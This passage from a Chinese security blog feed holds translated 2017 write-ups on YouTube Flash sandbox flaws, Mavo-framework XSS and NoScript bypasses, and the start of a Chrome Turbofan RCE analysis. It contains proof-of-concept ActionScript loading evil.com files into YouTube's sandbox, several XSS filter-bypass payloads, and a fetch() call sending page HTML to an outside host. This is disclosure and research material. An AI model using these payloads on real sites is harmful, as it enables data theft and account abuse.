才是它们在同一个沙箱的原因&lt;/p&gt;&lt;p&gt;在第一章中，我们已经能通过 `youtubeWrapper.getChildAt(0)` 获得 Youtube appLoader 的属性了。这一次，我们可以用 `appLoader.load(“evil.com/evil2.swf”,&lt;br&gt;SecurityDomain.currentDomain)` 让 appLoader 加载任意外部文件到主文件的沙箱中。&lt;/p&gt;&lt;p&gt;这是大致流程：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f35ed5b6664589f6d52e045e8e5ea950_r.png&quot; data-rawwidth=&quot;1609&quot; data-rawheight=&quot;596&quot;&gt;&lt;p&gt;PoC：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;var loader = new Loader();
// 加载 Youtube Wrapper (1)
loader.load(new
URLRequest(&quot;https://www.youtube.com/v/[VIDEO_ID]&quot;));
var youtubeWrapper = loader.content;
// 获得 Youtube Wrapper的appLoader对象
(3)
var appLoader = youtubeWrapper.getChildAt(0);
// 加载 evil2.swf 到 youtubeWrapper security sandbox. (4)
appLoader.load(new
URLRequest(&quot;http://evil.com/evil2.swf&quot;), new LoaderContext(false,
ApplicationDomain.currentDomain, SecurityDomain.currentDomain));
// 现在可以任意代码执行了！ (5)&lt;/code&gt;&lt;h2&gt; 一些技术细节：&lt;/h2&gt;&lt;p&gt;根据 flash 的官方文档，SecurityDomain.currentDomain 表示的是当前被写入沙箱的地址。事实上，它的变化远比官方描述的要复杂。&lt;/p&gt;&lt;p&gt;appLoader 确实是由 Youtube Wrapper 初始化的，但 appLoader 的`appLoader.load(evil.com/evil2.swf,SecurityDomain.currentDomain )` 却被算为 evil.swf 的调用。如果你对 flash 进行 debug，你会发现 evil2.swf 先被加载到 evil.swf 的沙箱。当 Youtube Wrapper 初始化完 appLoader 后，evil2.swf 又会返回到 Youtube 沙箱中执行。&lt;/p&gt;&lt;p&gt;加载完后，Flash Player 允许它发送请求到 `https://www.youtube.com/` 域名下的任意路径并用 `URLLoader` 读取任意响应&lt;/p&gt;&lt;p&gt;&amp;gt; URLLoader 相当于 JavaScript 的 XHR&lt;/p&gt;&lt;h2&gt;3 通过 loaderinfo.url 进行 XSF&lt;/h2&gt;&lt;p&gt;让我们来看看主程序是如何加载模块的：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-778139ea1cbee5edbb51342d73c60d90_r.png&quot; data-rawwidth=&quot;1337&quot; data-rawheight=&quot;320&quot;&gt;&lt;p&gt;通过插入自己的 URL(2) 以及替换文件名（更改 `watch_as3.swf` 为 `subtitles.swf`)，主程序可以动态生成模块的 URL 并处理多个版本。与此同时，主程序使用 `loaderInfo.url` 获得自己的url。&lt;/p&gt;&lt;p&gt;&amp;gt; appLoader 可以比作 html 的 iframe，它的 appLoader.loaderInfo.url 属性类似于 iframe 的src。不同的是 flash 可以同时加载多个 swf 文件，而 iframe 只能加载一个 url&lt;/p&gt;&lt;p&gt;但 loaderInfo.url 十分奇特，如果 appLoader 加载完主程序后直接载入其他 Flash 文件，主程序的 loaderInfo.url 会变成最新加载的 flash 的 url（而不是主程序的 url）。当主程序需要 url获取其它模块时，攻击者便有利可图。&lt;/p&gt;&lt;p&gt;POC 工作流程:&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-57c4a086ef0fe61c2d46007523b844c7_r.png&quot; data-rawwidth=&quot;1540&quot; data-rawheight=&quot;591&quot;&gt;&lt;p&gt;如图所示，我们先移除 Youtube Wrapper，再用 Evil Wrapper 代替它。Evil Wrapper 会先加载主程序（1），然后再加载另一个文件 Noop.swf（2）。当主程序尝试加载模块时，它将获取appLoader url 的值（3）(此时 loaderInfo.url 是 evil.com/Noop.swf，而主程序期盼的是s.ytime.com/watch_as3.swf) 并以该 domain 为基础更改模块地址(最终结果为evil.com/subtitles.swf)，最后导致任意 Flash 代码执行（4）&lt;/p&gt;&lt;p&gt;此时的 Evil Module 则被映射到 s.ytimg.com/[[IMPORT]]/evil.com/subtitles.swf。由于`s.ytimg.com` 处于沙箱中，我们不能用代码去获取 `https://s.ytimg.com/` 的 cookie，CSRF&lt;br&gt;token。&lt;/p&gt;&lt;p&gt;不过在第二章中，我介绍了和 XHR 类似的 URLLoader。如果一个服务器上的crossdomain.xml 允许 `s.ytimg.com`，那么我们可以对该服务器发起跨域请求。&lt;/p&gt;&lt;p&gt;&amp;gt; crossdomain.xml 的和 CORS 头的作用类似&lt;/p&gt;&lt;p&gt;所幸的是，谷歌的绝大部分域名都允许来自 `https://s.ytime.com/` 的跨域请求。因此我们可以直接通过跨域得到/篡改用户的敏感信息（比如读取 google doc 的文档，以被攻击者的身份在youtube 上传视频）。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;作者：Enguerran Gillier——&lt;/i&gt;&lt;/b&gt;&lt;a href=&quot;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/&quot;&gt;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/&quot;&gt;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-19-29469971</guid>
<pubDate>Tue, 19 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>用 javascript 框架绕过 XSS 防御</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-15-29358971.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;用 javascript 框架绕过 XSS 防御&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29358971&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在 AppSec Europe Sebastian Lekies 中，Krzysztof Kotowicz 和 Eduardo Vela Nava 展示了如何使用 javascript 框架来绕过 XSS 保护。在这篇文章中，我也会讲解如何利用 Mavo 来突破防御(特别是 NoScript 过滤器)。Marvo 允许开发者用纯 HTML 创建可交互的 Web App。它在 Smashing magzine 公布并很快引起了我的兴趣，因此我开始分析其符号标记及功能。&lt;/p&gt;&lt;h2&gt;$url的 DOM XSS&lt;/h2&gt;&lt;p&gt;通过 Mavo 的 $url，开发者可以方便地得到 GET 参数。比方说你想得到参数 x，那么你可以这么写：`$url.x //retrieves the GET parameter x`&lt;/p&gt;&lt;p&gt;很遗憾，这种方便也会带来 DOM 类型的 XSS。我在17年五月份汇报过类似问题给 CSS 工作组。他们用 Mavo 管理评论并设置 $url 参素为 href，代码大致如下：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;h1&amp;gt;&amp;lt;a href=&quot;{$url.spec}&quot;mv-attribute=&quot;null&quot;property=&quot;title&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt;&lt;/code&gt;&lt;p&gt;如你所见，他们通过 $url 获取参数。然而，这个链接只有在获取了有效数据的情况下才会被展示。我可以注入一个 javascript 伪协议，让其获得有效数据并回显：`javascript:alert(1)%252f%252f..%252fcss-images`&lt;/p&gt;&lt;p&gt;上面的攻击向量提供了一个相对路径。这样，Mavo 会先进入不存在的 javascript:alert(1) 文件夹，再通过`..`穿越到父目录读取有效的 css-images。除此之外，我还添加了两个换行符注释掉后面的非法语句，当目标点开这个链接时，就能保证用户正常执行代码。Mavo 至今依然有类似问题，有兴趣的可以点击[Poc]复现。&lt;/p&gt;&lt;h2&gt;远程加载 JSON 数据&lt;/h2&gt;&lt;p&gt;Mavo 支持用户通过 source 将 Mavo App 的数据源改为 local storage 或者其它位置。这一特性无疑大大地方便了攻击者篡改网页内容或者注入恶意 javascript URL。讽刺的是，Mavo 主页的 Demo 恰好有此类漏洞。我们可以用参数指向外部 JSON 文件(在跨域访问之前，记得开启“Access-Control-Allow-Origin:* ”头)并任意修改该 app 的数据。漏洞代码如下：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;a property=&quot;companyURL&quot;
mv-attribute=&quot;null&quot; href=&quot;[companyURL]&quot;
target=&quot;_blank&quot;&amp;gt;http://lea.verou.me&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;此处的 href 使用了一个 Mavo 的表达式。&quot;companyURL&quot;是从 JSON 中加载的。如果我们包含了如下 JSON 文件：&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{
&quot;companyLogo&quot;:
&quot;http://lea.verou.me/logo.svg&quot;,
&quot;companyName&quot;:
&quot;Pwnd Pwnd&quot;,
&quot;companyAddress&quot;:
&quot;Pwnd&quot;,
&quot;companyURL&quot;:
&quot;javascript:alert(1)&quot;,
&quot;companyEmail&quot;:
&quot;pwnd&quot;,
...&lt;/code&gt;&lt;p&gt;那么恶意的 javascript 协议会被引入，点击&lt;a href=&quot;http://portswigger-labs.net/mavo_invoice/?source=http://subdomain1.portswigger-labs.net/mavo_invoice/invoices.php&quot;&gt;[这里]&lt;/a&gt;复现。&lt;/p&gt;&lt;h2&gt;绕过 NoScript 检测&lt;/h2&gt;&lt;p&gt;Mavo 默认允许我们在 HTML 文件中添加 MavoScript（这个 DSL 加入了对 js 的一些改善和扩展）。说我们可以用 and，or，mod 代替符号运算。其中，=符号被用来判断（js 中是赋值）。再者，调用数学相关的方法时，我们不必使用 Math 对象（比方说直接 max(1,2,3)）。&lt;a href=&quot;https://mavo.io/docs/mavoscript/&quot;&gt;[这里]&lt;/a&gt;有更多信息。&lt;/p&gt;&lt;p&gt;如果 Mavo 解析到了无效的 MavoScript，那么其会被回滚，并用 javascript parser 解析该段代码。&lt;/p&gt;&lt;p&gt;比方说，我们想在 HTML 中计算1+1，那么我们可以通过[]插入表达式（类似 Angualr 的{{}}）：` [ 1+1 ] `&lt;/p&gt;&lt;p&gt;虽然 Mavo 并没有沙箱机制，但是我们的代码会被重写并在 with 中执行。因此，我们在调用的时候需要用到 self 或者 window 对象：`[self.alert(1)]`&lt;/p&gt;&lt;p&gt;Mavo 也支持 property 属性。它会将 DOM 元素和 javascript 变量关联起来，比方说：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;p&amp;gt;Slider value: [strength]/100&amp;lt;/p&amp;gt;
&amp;lt;input type=&quot;range&quot; property=&quot;strength&quot;
title=&quot;[strength]%&quot; /&amp;gt;&lt;/code&gt;&lt;p&gt;我们还注意到其它几个有意思的表达式：mv-value 和 mv-if 能脱离[]执行脚本。如果表达式为false，mv-if 会改变 DOM 值。值得注意的是这一表达式在任意标签上都可以使用：&lt;/p&gt;&lt;p&gt;`&amp;lt;div mv-if=”false”&amp;gt;Hide me&amp;lt;/div&amp;gt;`&lt;/p&gt;&lt;p&gt;在表达式中，MavoScript 有更有意思的行为。你可以使用没被双引号括起来的字符串（前提是它们需要包含字符，数字，或者下划线）。如果对象属性不存在的话，它们会被转换为空字符。&lt;/p&gt;&lt;p&gt;了解了这么多之后，我开始研究如何绕过 NoScript 过滤器，DOM 过滤器，和 CSP。其中，绕过 DOM 过滤器最为简单。因为你可以使用 data-* 属性来绕过 HTML 验证。在 Mavo 中，如果你要启用 CSP，就不得不开启 unsafe-eval。这意味着我们多了用 eval 直接执行字符串的危险。&lt;/p&gt;&lt;p&gt;我和 NoScript 的作者来了一场对抗赛，我的目标很简单：绕过 NoScript 并外带数据。我的第一个绕过是通过一个简单的 fetch 达成的：`[1 and self.fetch(&#39;//subdomain2.portswigger-labs.net/&#39;&amp;amp;encodeURIComponent(document.body.innerHTML))]`&lt;/p&gt;&lt;p&gt;因为 NoScript 过滤器看不懂 and，方括号和&amp;amp;，我可以通过&amp;amp;拼接字符串并发送 HTML。&lt;/p&gt;&lt;p&gt;后来 NoScript 开始检测这些关键字，不过我再一次 bypass 了它：`[&#39;&#39;=&#39;&#39;or self.alert(lol)]`。此处的=是用来判断，由于 javascript 并没有定义紧随其后的 or，所以 NoScript 不会认为后面的代码为 javascript。&lt;/p&gt;&lt;p&gt;正如我前面说的那样，mv- 属性允许表达式自定义分隔符（默认是：[]）执行 MavoScript。当NoScript 开始检查[]时，我们可以用该属性进一步绕过：`&amp;lt;div data-mv-expressions=&quot;lolx&lt;br&gt;lolx&quot;&amp;gt;lolxself.alert(&#39;lol&#39;)lolx&amp;lt;/div&amp;gt;`&lt;/p&gt;&lt;p&gt;接下来，我开始研究如何用 html 中的 Mavo 表达式绕过防御。通过在HTML中插入 javascript&lt;br&gt;url，我们可以轻易绕过 CSP：“&amp;lt;a href=[javascript&amp;amp;&#39;:alert(1)&#39;]&amp;gt;test&amp;lt;/a&amp;gt;”。虽然没有引号，这里的 `javascript` 是一个字符串，payload 再用&amp;amp;将 `javascript` 和 `&#39;:alert(1)&#39;` 拼合在一起。&lt;/p&gt;&lt;p&gt;后来 NoScript 作者又将上述 bypass 封杀，不过我发现了用多重表达式配合 tag 属性的绕过技巧：`&amp;lt;a href=&#39;[javascript][&quot;:&quot;][x.title][1][x.rel]&#39; rel=) id=x title=alert(&amp;gt;test&amp;lt;/a&amp;gt;`，或者：`&amp;lt;a href=javascript[x.rel]1)id=x rel=:alert(&amp;gt;test&amp;lt;/a&amp;gt;`&lt;/p&gt;&lt;p&gt;除此之外，我还可以用`/**/`强制 Mavo 解析器变为 javascript 模式，再用 js 的方式拼接字符串：`[/**/x=&#39;javascript&#39;][/**/x+=&#39;:alert&#39;+y.rel+y.title]&amp;lt;a href=[x] id=y title=1) rel=(&amp;gt;test&amp;lt;/a&amp;gt;`&lt;/p&gt;&lt;p&gt;如果函数调用末尾紧跟着数字，NoScript 就不会检查这个语句。而在 Mavo 中，mod 是一个运算符，因此我们可以用它在在函数后面接数字。由于我们并不需要空格（1%1不需要空格，所以1mod1也不用，毕竟它是一个运算符），NoScript 也不会检查该语句了：`[self.alert(1)mod1]`&lt;/p&gt;&lt;h2&gt;总结&lt;/h2&gt;&lt;p&gt;由于引入了大量特殊符号，Mavo 会大大地削弱 CSP，NoScript 等保护机制。除了传统的 DOM XSS 外，Mavo 还引入了数据源劫持等新型漏洞。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;作者：&lt;b&gt;Gareth Heyes——&lt;/b&gt;&lt;a href=&quot;http://blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html&quot;&gt;blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-15-29358971</guid>
<pubDate>Fri, 15 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>看我如何将 Flash 漏洞死灰复燃（1）</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-09-29195210.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;看我如何将 Flash 漏洞死灰复燃（1）&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29195210&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f6524a1333536281bfb19e59ece4f27a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Flash 不是一个 Dead App 了吗？&lt;/h2&gt;&lt;p&gt;尽管 Flash 安全的山河日渐衰败，但它依然不可小觑。哪怕是在今年，我也汇报了许多 flash 相关的漏洞给 Facebook，Youtube，WordPress，Yahoo 等公司。在近三年中，我在漏洞奖励项目中至少交了50个 Flash 漏洞。这些漏洞给我带来高达8万刀的奖励。然而这只是冰山一角，Flash 的漏洞远不仅如此。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fe7713ffe1d1548a0a6e1310d07f8d36_r.jpg&quot; data-rawwidth=&quot;300&quot; data-rawheight=&quot;184&quot;&gt;&lt;p&gt;虽然 Flash 在离我们远去，新引进的 javascript/HTML5 却带来新的一波问题。比方说 CORS滥用，由 XHR 或者 postMessage 引发的 DOM XSS。了解 Flash 曾犯下的安全问题有助于我们修补新时代的漏洞。Youtube 最新的 html5 API 就是由 Flash Api 移植的，这无疑值得我们探索。&lt;/p&gt;&lt;p&gt;在余下的篇幅中，我会介绍一些我在 Youtube Flash Api 中找到的精品Flash漏洞。由此引入 html/javascript 的一些安全技巧。&lt;/p&gt;&lt;h2&gt;对 Youtube Flash API 的逆向&lt;/h2&gt;&lt;p&gt;Youtube 的 Flash Api 使用户可以外链它的视频。下图大致描述了其工作流程：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f6524a1333536281bfb19e59ece4f27a_r.jpg&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;286&quot;&gt;&lt;p&gt;Youtube 的 Wrapper 位于 `youtube.com/v/[VIDEO_ID]` 的一个 Flash 文件。而主程序在 `domain s.ytimg.com`。剩下的模块则负责处理广告、副标题等内容。除了 Flash 到 javascript API，我们还可以发送 `play()`，`pause()` 等命令。Flash 文件会通过类似 ajax 的方式跨域请求视频数据及配置。&lt;/p&gt;&lt;h2&gt;漏洞1：用户信息泄漏&lt;/h2&gt;&lt;p&gt;我们先从一个简单的漏洞入手，这是一段精简过的 Flash ActionScript3 代码：&lt;/p&gt;&lt;code lang=&quot;as3&quot;&gt;public class YoutubeWrapper extends Sprite{
private var user_name =
&quot;The Victim&quot;;
private var user_picture =
&quot;https://googleusercontent.com/.../victim_photo.jpg&quot;;
private var appLoader =
new Loader();

public function
YoutubeWrapper(){
// 允许外部js/Flash获取其公开属性
Security.allowDomain(&quot;*&quot;);
// 加载主程序
this.appLoader
.load(new URLRequest(&quot;https://s.ytimg.com/.../watch_as3.swf&quot;);
// 将其加入为display container的child
this.addChild(this.appLoader );
//
loaderInfo.sharedEvents Api
this.loader.contentLoaderInfo.sharedEvents
.addEventListener(&quot;REQUEST_USERINFO&quot;, this.onRequestUserinfo);
}
private function
onRequestUserinfo(event:Event){
// 将用户信息写入event.data
// 我们可以通过 sharedEvents caller 获取它
event.data.user_name =
this.user_name;
event.data.user_image
= this.user_image;
}
}&lt;/code&gt;&lt;p&gt;Youtube Wrapper（包装页面）的属性 “user_name” 包含了谷歌帐号名（在登录了谷歌的情况下）。“user_picture” 则包含了到用户头像的链接。我们是否可以通过某种方法获取这些属性呢？&lt;/p&gt;&lt;p&gt;Youtube Wrapper 能够被开发者的 Flash 文件加载。然而它们都被沙箱政策限制着。&lt;/p&gt;&lt;p&gt;&amp;gt; 在 Flash 中引入外部 Flash 和加载 iframe 类似。如果 iframe 不是同源的，那么它就不能获得父页面的属性。&lt;/p&gt;&lt;p&gt;Youtube Wrapper 包含了 `Security.allowDomain(“*”)`，javascript 便可以向它发送 `play()`、`pause()` 等命令。这意味着在同一个沙箱中，攻击者的Wrapper可以获取任意 Youtube Wrapper 的公开属性。不幸的是，我们并不能获得私有属性。&lt;/p&gt;&lt;p&gt;让我们把目光移向 loaderInfo.sharedEvents，这个 API 允许 Loader 和被加载的文件互相通信。Youtube Wrapper 就用这个 API 和主程序通信。当主程序发送一个事件给 sharedEvent API 时，Youtube Wrapper 会接收该事件并返回 event.data 的信息。&lt;/p&gt;&lt;p&gt;除了 loader 和被加载的文件之外，任何有 loaderInfo 对象 reference（引用）的 Flash 文件都可以调用 loaderInfo.sharedEvents。&lt;/p&gt;&lt;p&gt;&amp;gt; 这个方法类似 postMessage。它们都提供了跨域通信的方式。不仅如此，只要对一个 iframe或者其父页面有 reference，其它窗口也可以调用 postMessage。只要用 window.open 或者window.frames，任意域名都可以访问到 reference。&lt;/p&gt;&lt;p&gt;如果我们可以访问到 loaderInfo 对象，我们就可以窃取用户信息了。可惜的是，loaderInfo 是Youtube Wrapper 的一个私有属性。&lt;/p&gt;&lt;p&gt;不过，当用 Loader 时，我们需要将其添加为 Display Contianer 的 child 以播放被加载的文件。通常来讲，我们会用 `this.addChild(this.loader);` 实现（Youtube Wrapper 也是这么做的）。Youtube Wrapper 还有一个公开的 `getChildAt()` 方法，这个函数会返回 loader 对象。我们可以通过它绕过前面的私有属性限制。&lt;/p&gt;&lt;p&gt;我们可以进一步使用 `YoutubeWrapper.getChildAt(0).loaderInfo.sharedEvents` 发送事件给Youtube。Youtube Wrapper 便会返回 event.data，泄漏隐私大功告成！&lt;/p&gt;&lt;p&gt;PoC：&lt;/p&gt;&lt;code lang=&quot;as3&quot;&gt;var loader = new Loader();
// 加载Youtube Wrapper
loader.load(new
URLRequest(&quot;https://www.youtube.com/v/[VIDEO_ID]&quot;));
var youtubeWrapper = loader.content;
// 访问Youtube AppLoader对象
var appLoader = youtubeWrapper.getChildAt(0);
// 访问appLoader的loaderInfo.sharedEvents
var LeakingSharedEvents = appLoader.contentLoaderInfo.sharedEvents;
// 准备要发给Youtube Wrapper的事件
var leakEvent = new Event(&quot;Request_username&quot;);
leakEvent.data = new Object();
// 发送leakEvent到LeakingSharedEvents
LeakingSharedEvents.dispatchEvent(leakEvent);

// 现在可以获得用户名和图像了
trace(leakEvent.data.user_name);
trace(leakEvent.data.user_picture);&lt;/code&gt;&lt;p&gt;大致工作流程：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a10403d51f4083427c26a8e2266857fc_r.png&quot; data-rawwidth=&quot;1358&quot; data-rawheight=&quot;486&quot;&gt;&lt;h2&gt;攻击方案&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;前提条件： 用户安装了 flash 并登录到 Google&lt;/li&gt;&lt;li&gt;1：目标访问攻击者控制的 evil.com/evil.html ，该页面包含了一个恶意 Flash 文件&lt;br&gt;evil.swf&lt;/li&gt;&lt;li&gt;2：evil.swf 加载 Youtube wrapper 并获取目标的用户名。除此之外，还可能通过用户头像的链接来判断出谷歌帐号&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;作者：&lt;b&gt;Enguerran Gillier&lt;/b&gt; ---&lt;a href=&quot;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/&quot;&gt;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-09-29195210</guid>
<pubDate>Sat, 09 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Chrome Trubofan 优化不当而导致的 RCE</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-06-29097125.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Chrome Trubofan 优化不当而导致的 RCE&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29097125&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;b&gt;简述&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在这篇文章中，我们将介绍 Chrome Turbofan 编译器触发的 RCE。由于其对代码优化方式不当，我们可以通过数值的形式来读取对象（在内存地址中访问到它们），同理，我们也能通过写入数据的方式任意伪造对象。&lt;/p&gt;&lt;h2&gt;对象 map&lt;/h2&gt;&lt;p&gt;每一个对象都用一个 map 来表示对象的结构（键值）。两个结构相同而值不同的对象则会拥有同样的 map。其最常见的表现方法如下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-58b15ebbdd84bac614920f8993055c38_r.png&quot; data-rawwidth=&quot;748&quot; data-rawheight=&quot;522&quot;&gt;&lt;p&gt;这里的 map 字段（可以理解为 map 的指针）保存了 map 对象。里面的两个常量数组（Extra&lt;br&gt;Properties, Elements)  则保存了额外的命名属性及其编号属性（又被称为元素）。&lt;/p&gt;&lt;h2&gt;Map转换&lt;/h2&gt;&lt;p&gt;当我们在对象中添加属性，原 map 会失效。为了适应新的结构，系统会创建一个新的 map。与此同时，原始的 map 中会加入转换描述描述符以展示如何讲原 map 更新。比如：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;Var obj = {}; // 新建对象，创建Map M0
obj.x = 1; //添加属性，创建了Map M1，新的Map显示了如何存储x
obj.y=1; // 类似上一语句&lt;/code&gt;&lt;p&gt;当内联的缓存缺失时，编译器可以利用描述符重重新优化函数。&lt;/p&gt;&lt;h2&gt;元素 (Elements) 种类&lt;/h2&gt;&lt;p&gt;如上所述，对象元素实际上是编号属性的键值。它们通常被保存到被对象所指向的常规数组中。对象 map 中有个名为 `ElementsKind` 的特殊字段。它负责告诉我们该元素数组的值是否为 boxed，unboxed，contiguous，或 sparse。仅仅用元素分类的 map 不会通过转换进行连接。&lt;/p&gt;&lt;h2&gt;V8数组&lt;/h2&gt;&lt;p&gt;V8引擎中的数组为有类型的 &#39;boxed&#39; 或 &#39;unboxed&#39; 数组。这可以帮助我们了解该数组是否只包含了 double 类型的值（interger 也用 double 表示）或者其它更复杂的值，比方说指向对象的指针。因为我们可以直接控制值，前一种情况又叫 *fast array*。&lt;/p&gt;&lt;p&gt;一图胜千言：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-421e198af13c4d108f8e48040d5fcca6_r.jpg&quot; data-rawwidth=&quot;1125&quot; data-rawheight=&quot;311&quot;&gt;&lt;p&gt;（数组本身的类型决定其值是 boxed 还是 unboxed）。&lt;/p&gt;&lt;p&gt;假设我们一开始有一个类似左边的数组，现在我们需要将一个对象赋值给这个 fast&lt;br&gt;array，那么整个数组和其存在的值都会变成 boxed。&lt;/p&gt;&lt;h2&gt;V8优化&lt;/h2&gt;&lt;p&gt;V8 编译器先用内联缓存产生即时编译代码，这时其对类型处理相对松散。&lt;/p&gt;&lt;p&gt;谷歌 V8 的文档中，解释如下：&lt;/p&gt;&lt;p&gt;“V8 在第一次执行时会将js编译为机器码。我们不会使用字节码和解释器。但是在执行时，V8会使用其它机器指令修改内联缓存以使其可以访问属性。。。”&lt;/p&gt;&lt;p&gt;”。。。V8 会通过预测来优化执行。如果一个类也会被未来的对象使用，V8 会根据相关信息修改指令已便使用隐藏类。如果预测成功，该属性仅需一次操作即可赋值或取值。反之，V8 会修复这段代码并移除优化。”&lt;/p&gt;&lt;p&gt;因此，编译器只会编译具体类型的代码。如果下一次这段代码执行与编译时不同的类型，编译器会抛出 “inline&lt;br&gt;cache miss” 错误并重编译这段代码。&lt;/p&gt;&lt;p&gt;比方说，我们有函数 `f` 和对象 o1，o2：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;f(arg_obj) {
return arg_obj.x;
}
var o1 = {“x”:1, “y”:2}
var o2 = {“x”:1, “t”:2}&lt;/code&gt;&lt;p&gt;如果我们先让 f 调用 o1，那么编译器会产生如下代码：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;(ecx holds the argument)
cmp [ecx + &amp;lt;hidden class offset&amp;gt;], &amp;lt;cached o1 class&amp;gt;
jne &amp;lt;inline cache miss&amp;gt; - this will execute compiler code
mov eax, [ecx + &amp;lt;cached x offset&amp;gt;]&lt;/code&gt;&lt;p&gt;当函数再次调用 o2，编译器就会产生 “inline cahce miss”，并重编译这段代码。&lt;/p&gt;&lt;h2&gt;漏洞分析&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;元素种类转换&lt;/h2&gt;&lt;p&gt;当缓存错误被触发时，编译器会保存转述符且用 `Map::FindElementsKindTransitionedMap` 生成 `ElementsKindTransitions`。之所以使用这种方式，是因为编译器仅需要改变`ElementsKind`。&lt;/p&gt;&lt;h2&gt;稳定的 map&lt;/h2&gt;&lt;p&gt;当代码访问元素时的操作得到了优化，那么这个 map 便是稳定的。&lt;/p&gt;&lt;p&gt;当编译器判断一个函数使用得差不多时，那么它就会进一步优化代码。这时，它会调用函数`ReduceElementAccess`  以减少对对象元素的访问，该函数会继续使用`ComputeElementAccessInfos`。&lt;/p&gt;&lt;p&gt;`ComputeElementAccessInfos` 也会寻找潜在的元素转换以方便优化。&lt;/p&gt;&lt;p&gt;然而当类似的转换是由稳定的 map 产生并使用，问题产生了。它只会影响当前函数，而相同map 里的其它函数则不会被考虑进去。这会产生如下现象：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;优化完函数后，编译器会改变稳定 map 中的元素。另外一个函数以某种方式被优化，使其存储/加载了同一张稳定 map 中的属性。现在，这张 map 的某个对象被创建。第一个函数被调用，使用该对象作为函数参数，然后元素种类会被修改。&lt;/li&gt;&lt;li&gt;第二个函数被调用了，然而并不会产生内联缓存缺失（元素种类转换并转到另一类map，因此不会造成缓存丢失）。&lt;/li&gt;&lt;li&gt;因为缓存没有缺失，函数依然能存储或加载 unboxed 元素，也就是说我们可以读取或写入对象指针数组。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;之前的 commit 中已经提到过这个问题：“如果需要元素种类转换时，请确保源图处于不稳定状态”。&lt;/p&gt;&lt;p&gt;当函数出现了缓存缺失时，编译器会检查是否可以使用元素类型转换来纠正此问题。这个工作是由 `KeyedStoreIC::StoreElementPolymorphicHandler` 